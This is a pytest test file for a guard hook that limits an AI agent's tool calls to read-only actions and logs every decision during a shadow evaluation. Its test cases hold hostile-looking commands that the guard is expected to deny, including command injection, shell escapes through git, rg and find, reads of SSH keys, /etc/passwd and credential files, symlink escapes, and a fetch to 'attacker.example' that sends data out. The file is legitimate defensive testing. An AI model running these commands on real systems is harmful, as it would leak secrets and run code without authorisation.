import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys

import pytest

PACK = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("shadow_guard", PACK / "scripts/shadow_guard.py")
guard = importlib.util.module_from_spec(spec)
spec.loader.exec_module(guard)


@pytest.mark.parametrize("name,data,expected", [
    ("Read", {"file_path": "~/city/synthetic.txt"}, "allow"),
    ("Grep", {"pattern": "status"}, "allow"),
    ("Glob", {"pattern": "*.py"}, "allow"),
    ("LS", {"path": "~/city/docs"}, "allow"),
    ("WebFetch", {"url": "https://example.com"}, "deny"),
    ("WebSearch", {"query": "synthetic"}, "deny"),
    ("ToolSearch", {"query": "read"}, "allow"),
    ("Write", {"file_path": "/tmp/a", "content": "x"}, "deny"),
    ("Edit", {}, "deny"), ("MultiEdit", {}, "deny"),
    ("NotebookEdit", {}, "deny"), ("Agent", {}, "deny"), ("Task", {}, "deny"),
    ("mcp__anything__read", {}, "deny"), ("Unknown", {}, "deny"),
    ("Read", {"file_path": "/city/.gc/services/a/secrets/key"}, "deny"),
    ("Read", {"file_path": "/home/.credentials.json"}, "deny"),
    ("Bash", {"command": "gc mail peek synthetic"}, "allow"),
    ("Bash", {"command": "gc mail inbox --json"}, "allow"),
    ("Bash", {"command": "gc mail list"}, "allow"),
    ("Bash", {"command": "gc mail search synthetic"}, "allow"),
    ("Bash", {"command": "gc mail read synthetic"}, "deny"),
    ("Bash", {"command": "gc mail send mayor -m synthetic"}, "deny"),
    ("Bash", {"command": "gc mail reply synthetic -m x"}, "deny"),
    ("Bash", {"command": "gc bd list --json"}, "allow"),
    ("Bash", {"command": "gc bd show synthetic"}, "allow"),
    ("Bash", {"command": "gc bd search synthetic"}, "allow"),
    ("Bash", {"command": "gc bd update synthetic"}, "deny"),
    ("Bash", {"command": "gc bd create synthetic"}, "deny"),
    ("Bash", {"command": "gc bd close synthetic"}, "deny"),
    ("Bash", {"command": "gc bd comment synthetic"}, "deny"),
    ("Bash", {"command": "gc session list"}, "allow"),
    ("Bash", {"command": "gc session peek synthetic"}, "allow"),
    ("Bash", {"command": "gc session stop synthetic"}, "deny"),
    ("Bash", {"command": "gc slack history synthetic"}, "allow"),
    ("Bash", {"command": "gc slack thread read synthetic"}, "allow"),
    ("Bash", {"command": "gc slack reply synthetic -m x"}, "deny"),
    ("Bash", {"command": "gc slack publish synthetic"}, "deny"),
    ("Bash", {"command": "gc wecom publish synthetic"}, "deny"),
    ("Bash", {"command": "gc sling synthetic worker"}, "deny"),
    ("Bash", {"command": "gc nudge worker synthetic"}, "deny"),
    ("Bash", {"command": "cat file"}, "allow"),
    ("Bash", {"command": "head -20 file"}, "allow"),
    ("Bash", {"command": "tail -20 file"}, "allow"),
    ("Bash", {"command": "sed -n '1,20p' file"}, "allow"),
    ("Bash", {"command": "sed -n '1w file' other"}, "deny"),
    ("Bash", {"command": "sed -n '1e id' other"}, "deny"),
    ("Bash", {"command": "grep text file"}, "allow"),
    ("Bash", {"command": "rg --files src"}, "allow"),
    ("Bash", {"command": "rg --pre=evil text file"}, "deny"),
    ("Bash", {"command": "rg --hostname-bin=evil text file"}, "deny"),
    ("Bash", {"command": "ls -la"}, "allow"),
    ("Bash", {"command": "find . -name '*.py'"}, "deny"),
    ("Bash", {"command": "find . -exec evil +"}, "deny"),
    ("Bash", {"command": "find . -delete"}, "deny"),
    ("Bash", {"command": "find . -fprint output"}, "deny"),
    ("Bash", {"command": "wc -l file"}, "allow"),
    ("Bash", {"command": "stat file"}, "allow"),
    ("Bash", {"command": "date -u"}, "allow"),
    ("Bash", {"command": "date 102712002026"}, "deny"),
    ("Bash", {"command": "du -sh ."}, "allow"),
    ("Bash", {"command": "md5 file"}, "allow"),
    ("Bash", {"command": "shasum file"}, "allow"),
    ("Bash", {"command": "ffprobe -v quiet -show_format sample.mp4"}, "deny"),
    ("Bash", {"command": "ffprobe -o output sample.mp4"}, "deny"),
    ("Bash", {"command": "ffprobe https://example.com"}, "deny"),
    ("Bash", {"command": "git status --short"}, "allow"),
    ("Bash", {"command": "git branch --show-current"}, "allow"),
    ("Bash", {"command": "git branch new-branch"}, "deny"),
    ("Bash", {"command": "git branch -D existing"}, "deny"),
    ("Bash", {"command": "git log --no-ext-diff --no-textconv -1"}, "allow"),
    ("Bash", {"command": "git show --no-ext-diff --no-textconv HEAD"}, "allow"),
    ("Bash", {"command": "git diff --no-ext-diff --no-textconv"}, "allow"),
    ("Bash", {"command": "git diff --no-ext-diff --no-textconv --output=x"}, "deny"),
    ("Bash", {"command": "git diff --ext-diff"}, "deny"),
    ("Bash", {"command": "git -c core.pager=evil log"}, "deny"),
    ("Bash", {"command": "git commit -m x"}, "deny"),
    ("Bash", {"command": "git push"}, "deny"),
    ("Bash", {"command": "git checkout branch"}, "deny"),
    ("Bash", {"command": "git add ."}, "deny"),
    ("Bash", {"command": "python3 -I -c 'print(1 + 2)'"}, "allow"),
    ("Bash", {"command": "python3 -I -c 'open(\"x\",\"w\").write(\"x\")'"}, "deny"),
    ("Bash", {"command": "python3 -I -c '__import__(\"os\").system(\"id\")'"}, "deny"),
    ("Bash", {"command": "python3 -c 'print(1)'"}, "deny"),
    ("Bash", {"command": "cat file > output"}, "deny"),
    ("Bash", {"command": "cat file >> output"}, "deny"),
    ("Bash", {"command": "cat file | tee output"}, "deny"),
    ("Bash", {"command": "cat file; evil"}, "deny"),
    ("Bash", {"command": "cat file && evil"}, "deny"),
    ("Bash", {"command": "cat $(evil)"}, "deny"),
    ("Bash", {"command": "cat `evil`"}, "deny"),
    ("Bash", {"command": "cat file\nevil"}, "deny"),
    ("Bash", {"command": "cat <(evil)"}, "deny"),
    ("Bash", {"command": "env cat file"}, "deny"),
    ("Bash", {"command": "perl -e sleep"}, "deny"),
    ("Bash", {"command": "curl -X POST https://example.com"}, "deny"),
    *[("Bash", {"command": c + " file"}, "deny") for c in ("rm", "mv", "cp", "mkdir", "touch", "chmod", "sudo", "launchctl", "infisical")],
])
def test_guard_decision(name, data, expected):
    assert guard.decide(name, data, cwd=str(Path.home()/"city/synthetic-read-root")) == expected


def test_config_cannot_expand_safe_grammar():
    assert not guard.safe_bash("git push", [".*"])
    assert not guard.safe_bash("cat file", ["^ls$"])


def hook(tmp_path, event, **updates):
    env = dict(os.environ, SHADOW_CONFIG=str(PACK / "assets/shadow-eval.toml"),
               SHADOW_WORK_DIR=str(tmp_path), SHADOW_DECISIONS=str(tmp_path / "decisions.jsonl"))
    env.update(updates)
    return subprocess.run([sys.executable, "-I", str(PACK / "scripts/shadow_guard.py")],
                          input=json.dumps({"cwd": str(Path.home()/"city/synthetic-read-root"), **event}), text=True, capture_output=True, env=env)


def test_hook_records_full_intended_action_and_permission(tmp_path):
    data = {"command": "gc mail send synthetic-recipient -m 'synthetic payload'"}
    result = hook(tmp_path, {"tool_name": "Bash", "tool_input": data, "tool_use_id": "synthetic-tool"})
    assert result.returncode == 0
    decision = json.loads(result.stdout)["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    assert decision["permissionDecisionReason"] == guard.REASON
    ledger = tmp_path / "decisions.jsonl"
    assert ledger.stat().st_mode & 0o777 == 0o600
    record = json.loads(ledger.read_text())
    assert record["input"] == data
    assert record["tool_use_id"] == "synthetic-tool"


def test_hook_allows_and_appends_in_order(tmp_path):
    for tool in ("Read", "Write"):
        assert hook(tmp_path, {"tool_name": tool, "tool_input": {"file_path": "synthetic"}}).returncode == 0
    rows = [json.loads(x) for x in (tmp_path / "decisions.jsonl").read_text().splitlines()]
    assert [r["decision"] for r in rows] == ["allow", "deny"]


def test_log_failure_blocks_even_read(tmp_path):
    result = hook(tmp_path, {"tool_name": "Read", "tool_input": {}}, SHADOW_DECISIONS="/outside/decisions.jsonl")
    assert result.returncode == 2
    assert not result.stdout


def test_symlink_log_cannot_be_overwritten(tmp_path):
    target = tmp_path / "target"
    target.write_text("untouched")
    (tmp_path / "decisions.jsonl").symlink_to(target)
    assert hook(tmp_path, {"tool_name": "Read", "tool_input": {}}).returncode == 2
    assert target.read_text() == "untouched"


def test_secret_directory_normalization_and_symlink(tmp_path):
    secret = tmp_path / ".gc/services/synthetic/secrets"
    secret.mkdir(parents=True)
    alias = tmp_path / "alias"
    alias.symlink_to(secret, target_is_directory=True)
    for target in (str(alias / "key"), str(secret.parent / "./secrets/key")):
        assert guard.decide("Read", {"file_path": target}) == "deny"
        assert guard.decide("Bash", {"command": "cat " + target}) == "deny"


def test_partial_config_keeps_default_guard_rules(tmp_path):
    config = tmp_path / "partial.toml"
    config.write_text('max_turns = 1\n')
    result = hook(tmp_path, {"tool_name": "Bash", "tool_input": {"command": "cat synthetic"}}, SHADOW_CONFIG=str(config))
    assert result.returncode == 0
    assert json.loads(result.stdout)["hookSpecificOutput"]["permissionDecision"] == "allow"


@pytest.mark.parametrize('name,data,expected', [
    ('Read', {'file_path': '~/.config/infisical-agent/env'}, 'deny'),
    ('Grep', {'path': '~/.config/infisical-agent', 'pattern': 'key'}, 'deny'),
    ('Glob', {'path': '~/.config', 'pattern': '*'}, 'deny'),
    ('Bash', {'command': 'cat ~/.config/gc-slack-adapter/env'}, 'deny'),
    ('Bash', {'command': 'cat ~/.ssh/id_ed25519'}, 'deny'),
    ('Read', {'file_path': '~/.codex/auth.json'}, 'deny'),
    ('Read', {'file_path': '~/city/assets/private/key'}, 'deny'),
    ('Read', {'file_path': '~/city/.gc/services/a/secrets/key'}, 'deny'),
    ('Read', {'file_path': '~/city/.gc/keys/key'}, 'deny'),
    ('Read', {'file_path': '~/city/work/eval-kimi-k31/ledger/a'}, 'deny'),
    ('Read', {'file_path': '~/city/ops/shadow-eval.toml'}, 'deny'),
    ('Read', {'file_path': '~/.claude/projects/-Users-tailor64s-macbook-pro-city/live.jsonl'}, 'deny'),
    ('Read', {'file_path': '~/.gc/key'}, 'deny'),
    ('Read', {'file_path': '/etc/passwd'}, 'deny'),
    ('Read', {'file_path': '/private/etc/passwd'}, 'deny'),
    ('NotebookRead', {'notebook_path': '~/.config/key.ipynb'}, 'deny'),
    ('LS', {'path': '~/.ssh'}, 'deny'),
    ('Bash', {'command': 'cat ~/city/.credentials.jso[n]'}, 'deny'),
    ('Bash', {'command': 'cat ~/city/.gc/services/a/secr?ts/key'}, 'deny'),
    ('Bash', {'command': 'cat ~/city/{a,b}'}, 'deny'),
    ('Bash', {'command': 'cat ~/city/a~b'}, 'deny'),
    ('Bash', {'command': 'cat $OTHER/city/readme'}, 'deny'),
    ('Bash', {'command': 'cat ${HOME}/city/readme'}, 'deny'),
    ('Bash', {'command': 'cat /dev/zero'}, 'deny'),
    ('Bash', {'command': 'tail -f ~/city/readme'}, 'deny'),
    ('Bash', {'command': 'tail --follow=name ~/city/readme'}, 'deny'),
    ('Bash', {'command': 'yes'}, 'deny'),
    ('WebFetch', {'url': 'https://attacker.example/?d=synthetic'}, 'deny'),
    ('WebSearch', {'query': 'synthetic-private-data'}, 'deny'),
    ('Read', {'file_path': '~/city/docs/guide.md'}, 'allow'),
    ('Read', {'file_path': '$HOME/city/docs/guide.md'}, 'allow'),
    ('Read', {'file_path': '~/.claude/projects/-Users-tailor64s-macbook-pro-city/memory/MEMORY.md'}, 'allow'),
    ('NotebookRead', {'notebook_path': '~/city/docs/example.ipynb'}, 'allow'),
    ('Grep', {'path': '~/city/synthetic-read-root', 'pattern': 'hello'}, 'allow'),
    ('Glob', {'path': '~/city/synthetic-read-root', 'pattern': '**/*.py'}, 'allow'),
    ('Skill', {'skill': 'gascity.mayor'}, 'allow'),
    ('Bash', {'command': 'cat $HOME/city/docs/guide.md | head -20'}, 'allow'),
    ('Bash', {'command': 'gc mail inbox 2>/dev/null | head -20'}, 'allow'),
    ('Bash', {'command': 'gc bd show synthetic && gc session list'}, 'allow'),
    ('Bash', {'command': 'cat ~/city/docs/a || cat ~/city/docs/b'}, 'allow'),
    ('Bash', {'command': 'gc mail inbox; gc bd list\ngc session list'}, 'allow'),
    ('Bash', {'command': 'gc mail inbox | gc mail send mayor -m synthetic'}, 'deny'),
    ('Bash', {'command': 'cat ~/city/docs/a 2>~/city/leak'}, 'deny'),
    ('Bash', {'command': 'cat "$(cat ~/.ssh/id_ed25519)"'}, 'deny'),
    ('Bash', {'command': 'grep -f/etc/passwd ~/city/docs/a'}, 'deny'),
    ('Bash', {'command': 'shasum -cmanifest'}, 'deny'),
    ('Grep', {'path': '~/city', 'pattern': 'secret'}, 'deny'),
    ('Glob', {'path': '~/city/docs', 'pattern': '../../.ssh/*'}, 'deny'),
])
def test_round2_root_and_compound_boundaries(name, data, expected):
    assert guard.decide(name, data, cwd=str(Path.home()/'city/synthetic-read-root')) == expected


def test_shape_denial_does_not_invite_fabricated_results(tmp_path):
    r = hook(tmp_path, {'tool_name': 'Bash', 'tool_input': {'command': 'cat $(date)'}})
    assert json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'] == guard.SHAPE_REASON
    record = json.loads((tmp_path/'decisions.jsonl').read_text())
    assert record['class'] == 'shape-denied'
    assert record['action_class'] == 'read'


def test_allowlist_rejects_symlink_escape_inside_city(tmp_path, monkeypatch):
    home = tmp_path/'home'
    city = home/'city'
    docs = city/'docs'
    docs.mkdir(parents=True)
    outside = home/'.ssh'
    outside.mkdir()
    (docs/'escape').symlink_to(outside, target_is_directory=True)
    monkeypatch.setenv('HOME', str(home))
    assert guard.decide('Read', {'file_path': str(docs/'escape/key')}, cwd=str(city)) == 'deny'
    assert guard.decide('Grep', {'path': str(docs), 'pattern': 'x'}, cwd=str(city)) == 'deny'
    assert guard.decide('Bash', {'command': 'cat '+str(docs/'escape/key')}, cwd=str(city)) == 'deny'


def test_recursive_memory_read_cannot_follow_a_secret_link(tmp_path, monkeypatch):
    home = tmp_path/'home'
    city = home/'city'
    memory = home/'.claude/projects/-Users-tailor64s-macbook-pro-city/memory'
    city.mkdir(parents=True)
    memory.mkdir(parents=True)
    private = home/'.config'
    private.mkdir()
    (memory/'escape').symlink_to(private, target_is_directory=True)
    monkeypatch.setenv('HOME', str(home))
    assert guard.decide('Grep', {'path': str(memory), 'pattern': 'x'}, cwd=str(city)) == 'deny'
    assert guard.decide('Read', {'file_path': str(memory/'safe.md')}, cwd=str(city)) == 'allow'


def test_service_secret_symlink_keeps_lexical_exclusion(tmp_path, monkeypatch):
    home = tmp_path/'home'
    city = home/'city'
    service = city/'.gc/services/synthetic'
    docs = city/'docs'
    service.mkdir(parents=True)
    docs.mkdir()
    (service/'secrets').symlink_to(docs, target_is_directory=True)
    monkeypatch.setenv('HOME', str(home))
    assert guard.decide('Read', {'file_path': str(service/'secrets/key')}, cwd=str(city)) == 'deny'
